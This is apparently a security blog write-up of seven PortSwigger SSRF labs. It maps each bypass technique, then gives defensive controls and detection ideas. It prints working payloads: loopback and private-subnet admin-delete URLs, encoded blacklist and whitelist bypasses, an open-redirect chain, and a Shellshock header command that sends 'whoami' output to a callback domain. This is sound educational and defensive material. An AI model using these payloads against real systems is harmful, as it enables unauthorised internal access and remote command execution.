---
layout: post
title: "SSRF Is a Network Position Bug - A Seven-Lab Map"
date: 2026-06-12 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [ssrf, portswigger, url-parsing, oast, shellshock, internal-network]
related_posts:
  - entity-resolution-is-a-file-and-network-boundary
  - web-cache-deception-five-labs
  - 18-sqli-labs-from-tautologies-to-oob
---

Server-side request forgery is often described as "make the server request a URL." That is accurate, but too small.

The more useful framing is this:

**SSRF is a network position bug.** The attacker is not merely changing a string. They are borrowing the server's routing table, DNS view, firewall position, internal trust, and sometimes its request headers.

The seven PortSwigger SSRF labs form a compact map of that boundary: direct loopback access, internal subnet discovery, blind callbacks, blacklist bypasses, redirect-following mistakes, header-to-CGI risk, and URL parser disagreement.

## The map

| Lab group | Sink | Feedback | Core failure |
|-----------|------|----------|--------------|
| local admin | `stockApi` | HTTP response | backend can reach loopback admin |
| backend admin | `stockApi` | status/content | backend can scan `192.168.0.0/24` |
| blind analytics | `Referer` | OAST | analytics fetches attacker-controlled headers |
| blacklist bypass | `stockApi` | HTTP response | filter checks strings, requester uses normalized URL |
| open redirect | `stockApi` + same-site redirect | HTTP response | first hop is allowed, final hop is not revalidated |
| header-to-CGI | `Referer` + `User-Agent` | OAST or answer endpoint | internal service inherits dangerous request header state |
| whitelist bypass | `stockApi` | HTTP response | validator and requester disagree about the URL host |

The table is the method. For every SSRF sink, ask: who parses the URL, who resolves DNS, who follows redirects, and what network can that component reach?

## Start with the boring direct case

The stock checker sends a URL to the backend:

```http
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

Changing `stockApi` to `http://localhost/admin` returns the local admin page. Changing it again to:

```text
http://localhost/admin/delete?username=carlos
```

performs the state-changing action.

That is the cleanest SSRF shape: the user cannot reach `/admin`, but the backend can. The vulnerable feature converts an external parameter into an internal request.

The second lab keeps the primitive but removes the known host. The target is somewhere in:

```text
http://192.168.0.X:8080/admin
```

The signal is response status and content. One host returns the admin page, then `/admin/delete?username=carlos` solves the lab. Detection-wise, this looks like one business endpoint causing many backend requests across a private subnet.

## Blind SSRF: first prove the request

The blind lab has no response body channel. Product-page analytics fetches the URL in the `Referer` header:

```http
GET /product?productId=1
Referer: http://<oast-domain>/ref
```

That is enough to prove the primitive. You do not need data exfiltration before you have basic interaction.

PortSwigger restricts arbitrary third-party OAST services in these labs, so Collaborator/OAST domains are the reliable option. In normal work, if a lab truly requires reading a Collaborator DNS label and there is no equivalent return channel, the honest status is "needs OAST review," not "almost solved."

## Blacklists validate representations, not destinations

The blacklist lab blocks obvious loopback and the literal path:

```text
http://127.0.0.1/
http://127.1/admin
```

The working shape is:

```text
http://127.1/%61dmin/delete?username=carlos
```

When this is submitted as form data, `%61` travels as `%2561`, so the path is double encoded at the HTTP body layer. The filter does not see the literal `admin`, but the downstream request handling resolves it.

The durable lesson is not "try 127.1." It is that a blacklist usually inspects a representation. Security decisions need to be made on the final normalized destination.

## Redirects are second requests

The open-redirection lab blocks direct off-site URLs in `stockApi`, but accepts a same-site URL:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

The stock checker requests the same-site path, receives a redirect, and follows it to the internal admin host. The delete variant is:

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

This is why redirect handling belongs in SSRF defenses. Validating only the first URL is not enough. Every hop is a new destination decision.

## Headers can be part of the SSRF surface

The Shellshock lab combines two boundaries:

1. analytics uses `Referer` to choose an internal target;
2. the internal CGI service carries `User-Agent` into a Bash environment.

The official proof shape is a minimal DNS callback:

```text
() { :; }; /usr/bin/nslookup $(whoami).<collaborator-domain>
```

For this run, I used the lab's own answer endpoint as the return channel: the internal host submitted `answer=$(whoami)` back to `/submitSolution`. That avoided a manual Collaborator dependency while keeping the validation inside the authorized Academy instance.

The broader point is that SSRF is not always only about the URL. Headers, proxy metadata, Host routing, and CGI environment construction can turn a blind request primitive into something more serious.

## Parser disagreement is the expert-level footgun

The whitelist lab only allows:

```text
stock.weliketoshop.net
```

The parser accepts embedded credentials:

```text
http://username@stock.weliketoshop.net/
```

The final payload uses a double-encoded fragment:

```text
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

One layer sees the whitelisted host. A later decoding/request layer treats the `#@stock...` part as a fragment and connects to `localhost:80`.

This is the same class of mistake as many cache and path-normalization bugs: validation and execution are using different parsers or different decode stages.

## Defender notes

The best SSRF defense is architectural: do not let users provide arbitrary backend URLs. Map a business identifier to a fixed backend destination. If dynamic fetching is truly required, apply a strict allowlist after normalization and DNS resolution, then repeat the check on every redirect hop.

Operational controls:

- block egress to loopback, link-local, RFC1918, and cloud metadata addresses;
- disable automatic redirects or revalidate every final URL;
- use one URL parser for validation and execution;
- strip user-controlled headers before internal proxying;
- require real authentication on internal admin endpoints;
- log outbound requests from application servers with source feature and request ID.

Detection ideas:

- backend requests to `127.0.0.1`, `127.1`, `localhost`, `169.254.169.254`, or private subnets;
- parameters named `url`, `uri`, `path`, `next`, `redirect`, `callback`, or `stockApi` containing private IPs, userinfo, encoded fragments, or OAST domains;
- one application endpoint fanning out across many internal hosts;
- redirect chains from same-site URLs to private addresses;
- internal service logs showing unusual `User-Agent`, forged `Host`, or OAST domains.

SSRF is easiest to prevent when it is treated as privileged network access, not as a convenience wrapper around `fetch(url)`.
